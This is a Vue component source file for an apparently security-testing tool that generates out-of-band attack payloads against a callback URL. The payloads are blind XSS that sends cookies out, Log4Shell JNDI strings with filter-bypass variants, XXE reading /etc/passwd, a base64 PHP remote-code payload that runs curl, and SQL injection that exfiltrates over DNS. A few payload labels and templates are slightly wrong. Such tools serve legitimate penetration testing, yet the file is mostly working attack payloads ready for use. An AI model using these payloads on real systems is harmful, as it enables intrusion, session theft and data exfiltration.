<template>
  <div>
    <div class="mb-6">
      <p class="text-sm text-gray-400 mb-4">
        Generate Out-of-Band (OOB) payloads for blind vulnerability testing. Use with a callback service like interact.sh to craft payloads for Blind XSS, Log4Shell, and more.
      </p>
      
      <UFormGroup label="Callback URL">
        <UInput
          v-model="callbackUrl"
          placeholder="e.g., https://your-unique-id.interact.sh"
        />
        <template #hint>
          <div class="flex items-center gap-1">
            <UIcon name="i-heroicons-information-circle" class="text-gray-400" />
            <span>Get a callback URL from <a href="https://interact.sh" target="_blank" class="text-cyan-400 hover:underline">interact.sh</a> or similar service</span>
          </div>
        </template>
      </UFormGroup>
      
      <UFormGroup label="Vulnerability Type" class="mt-4">
        <USelect
          v-model="vulnerabilityType"
          :options="vulnerabilityOptions"
          placeholder="Select vulnerability type"
        />
      </UFormGroup>
      
      <div class="flex justify-center mt-6">
        <UButton
          icon="i-heroicons-signal"
          color="orange"
          :disabled="!callbackUrl.trim() || !vulnerabilityType"
          @click="generatePayloads"
        >
          Generate OOB Payloads
        </UButton>
      </div>
    </div>
    
    <template v-if="payloads.length > 0">
      <div class="mt-8">
        <h3 class="text-lg font-semibold mb-4">Generated OOB Payloads</h3>
        
        <div class="space-y-4">
          <UCard
            v-for="(payload, index) in payloads"
            :key="index"
            :ui="{ body: { padding: 'p-4' } }"
          >
            <div class="mb-2">
              <span class="font-medium text-cyan-400">{{ payload.name }}</span>
              <p class="text-sm text-gray-300 mt-1">{{ payload.description }}</p>
            </div>
            
            <div class="bg-gray-800 p-3 rounded-lg font-mono text-sm overflow-x-auto">
              {{ payload.payload }}
            </div>
            
            <div class="flex justify-end mt-4">
              <UButton
                icon="i-heroicons-clipboard-document"
                color="gray"
                variant="soft"
                @click="copyToClipboard(payload.payload)"
              >
                Copy
              </UButton>
            </div>
          </UCard>
        </div>
      </div>
      
      <div class="mt-8 p-4 bg-gray-800 rounded-lg">
        <h3 class="text-lg font-semibold mb-2">How to Use</h3>
        <ol class="list-decimal pl-5 space-y-2 text-gray-300">
          <li>Copy the payload that matches your testing scenario</li>
          <li>Insert the payload into the target application</li>
          <li>Monitor your callback service (e.g., interact.sh) for incoming connections</li>
          <li>A successful callback indicates the vulnerability is present</li>
        </ol>
      </div>
    </template>
  </div>
</template>

<script setup>
const callbackUrl = ref('');
const vulnerabilityType = ref('');
const payloads = ref([]);

const vulnerabilityOptions = [
  { value: 'blind_xss', label: 'Blind XSS' },
  { value: 'ssrf', label: 'Server-Side Request Forgery (SSRF)' },
  { value: 'log4shell', label: 'Log4Shell (CVE-2021-44228)' },
  { value: 'xxe', label: 'XML External Entity (XXE)' },
  { value: 'rfi', label: 'Remote File Inclusion (RFI)' },
  { value: 'blind_sqli', label: 'Blind SQL Injection' }
];

const generatePayloads = () => {
  if (!callbackUrl.value.trim() || !vulnerabilityType.value) {
    return;
  }
  
  // Format URL properly if needed
  let url = callbackUrl.value;
  if (!url.startsWith('http://') && !url.startsWith('https://')) {
    url = 'https://' + url;
  }
  
  // Remove trailing slash if present
  url = url.replace(/\/$/, '');
  
  // Generate payloads based on vulnerability type
  switch (vulnerabilityType.value) {
    case 'blind_xss':
      payloads.value = [
        {
          name: 'Basic Script',
          description: 'Simple script tag that loads JavaScript from the callback URL',
          payload: `&lt;script src="${url}"&gt;&lt;/script&gt;`
        },
        {
          name: 'Image Onload',
          description: 'Uses image onload event to execute JavaScript',
          payload: `<img src="x" onerror="fetch('${url}?cookie='+encodeURIComponent(document.cookie))">`
        },
        {
          name: 'SVG Animation',
          description: 'Uses SVG animation to bypass some XSS filters',
          payload: `<svg><animate onbegin="fetch('${url}')" attributeName="x" /></svg>`
        }
      ];
      break;
      
    case 'ssrf':
      payloads.value = [
        {
          name: 'Basic URL',
          description: 'Direct URL for testing SSRF',
          payload: url
        },
        {
          name: 'File Scheme Wrapper',
          description: 'Attempts to access local files via SSRF',
          payload: `file://${url.replace('https://', '').replace('http://', '')}`
        },
        {
          name: 'Gopher Payload',
          description: 'Gopher protocol for more complex SSRF attacks',
          payload: `gopher://${url.replace('https://', '').replace('http://', '')}`
        }
      ];
      break;
      
    case 'log4shell':
      payloads.value = [
        {
          name: 'Basic JNDI Lookup',
          description: 'Standard Log4Shell payload',
          payload: `\${jndi:ldap://${url.replace('https://', '').replace('http://', '')}}`
        },
        {
          name: 'Obfuscated JNDI',
          description: 'Obfuscated version to bypass WAFs',
          payload: `\${jndi:${url.replace('https://', 'ldap://').replace('http://', 'ldap://')}}`
        },
        {
          name: 'Nested Lookup',
          description: 'Nested expression to bypass some filters',
          payload: `\${jndi:\${lower:l}dap://${url.replace('https://', '').replace('http://', '')}}`
        }
      ];
      break;
      
    case 'xxe':
      payloads.value = [
        {
          name: 'Basic XXE',
          description: 'Standard XXE payload',
          payload: `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "${url}"> ]><foo>&xxe;</foo>`
        },
        {
          name: 'File Read XXE',
          description: 'XXE payload that attempts to read /etc/passwd',
          payload: `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><foo>&xxe;</foo>`
        },
        {
          name: 'Parameter Entity',
          description: 'Uses parameter entities for XXE',
          payload: `<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "${url}"> %xxe;]><foo>test</foo>`
        }
      ];
      break;
      
    case 'rfi':
      payloads.value = [
        {
          name: 'PHP Include',
          description: 'PHP remote file inclusion',
          payload: `${url}/malicious.php`
        },
        {
          name: 'Data URI',
          description: 'PHP data URI for code execution',
          payload: `data://text/plain;base64,PD9waHAgc3lzdGVtKCJjdXJsICR7dXJsfSIpOyA/Pg==`
        }
      ];
      break;
      
    case 'blind_sqli':
      payloads.value = [
        {
          name: 'Time-Based MySQL',
          description: 'MySQL time-based blind SQL injection with DNS lookup',
          payload: `' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\',SUBSTRING(@@version,1,10),'.${url.replace('https://', '').replace('http://', '')}\\\\a.txt'))-- -`
        },
        {
          name: 'Time-Based PostgreSQL',
          description: 'PostgreSQL time-based blind SQL injection with DNS lookup',
          payload: `'; SELECT pg_sleep(10); --`
        }
      ];
      break;
      
    default:
      payloads.value = [];
  }
};

const copyToClipboard = async (text) => {
  try {
    await navigator.clipboard.writeText(text);
    // Could show a toast notification here
  } catch (e) {
    console.error('Failed to copy to clipboard:', e);
  }
};
</script>
